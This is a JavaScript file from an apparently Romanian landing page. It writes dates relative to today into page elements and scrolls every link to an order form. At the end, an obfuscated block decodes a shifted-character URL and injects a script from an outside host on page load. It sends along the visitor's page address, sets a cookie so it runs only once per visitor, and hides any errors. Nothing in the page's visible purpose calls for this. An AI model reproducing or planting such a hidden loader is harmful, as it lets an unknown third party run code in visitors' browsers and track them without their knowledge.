const months = [
    "ianuarie",
    "februarie",
    "martie",
    "aprilie",
    "mai",
    "iunie",
    "iulie",
    "august",
    "septembrie",
    "octombrie",
    "noiembrie",
    "decembrie",
  ],
  monthMin = ["", "", "", "", "", "", "", "", "", "", "", ""],
  days = ["duminică", "luni", "marți", "miercuri", "joi", "vineri", "sâmbătă"],
  daysMin = ["", "", "", "", "", "", ""],
  seasons = ["iarnă", "arc", "vară", "toamnă"];
function postDate(e, t, n, a, l) {
  for (let e = 0; e < 60; e++) r(e, "date-"), r(e, "date");
  function r(e, t) {
    let n;
    n = "date-" === t ? -e : e;
    const a = new Date(Date.now() + 864e5 * n),
      l = a.getDate(),
      r = a.getMonth() + 1,
      i = a.getFullYear(),
      u = c(l),
      s = u + "." + c(r) + "." + i,
      d = t + e,
      m = document.querySelectorAll("." + d);
    for (let e = 0; e < m.length; e++) {
      const t = m[e].dataset.format;
      m[e].innerHTML = void 0 !== t && "" !== t ? String(o(u, r, i, t, n)) : s;
    }
  }
  function o(e, t, a, l, r) {
    let o = l;
    const u = ["dd", "mm", "yyyy", "monthFull"],
      s = { dd: e, mm: c(t), yyyy: a, monthFull: i(t, n, !1) };
    for (let e = 0; e < u.length; e++) {
      let t = u[e],
        n = new RegExp(t);
      o = o.replace(n, s[t]);
    }
    return o.split(" ").join(" ");
  }
  function i(e, t, n, a) {
    const l = a || 0;
    let r;
    return (
      (r = e + l > 12 ? l - (12 - e) : e + l),
      (r = e + l <= 0 ? 12 + l + 1 : e + l),
      (o = n),
      (i = t[r - 1]),
      o && i && i.length > 0 ? i[0].toUpperCase() + i.slice(1) : i
    );
    var o, i;
  }
  function c(e) {
    return e < 10 ? "0" + e : e;
  }
}
document.body.classList.contains("ev-date") &&
  document.addEventListener("DOMContentLoaded", function () {
    postDate(days, daysMin, months, monthMin, seasons);
  }),
  $(function () {
    $("a")
      .not("#cert")
      .click(function () {
        $("html, body").animate(
          { scrollTop: $("#form").offset().top - 20 },
          "slow"
        );
      });
  });
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44fun3z" + "xjwxyfynhx3htr" + "4ljy4xyfynh3ox") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);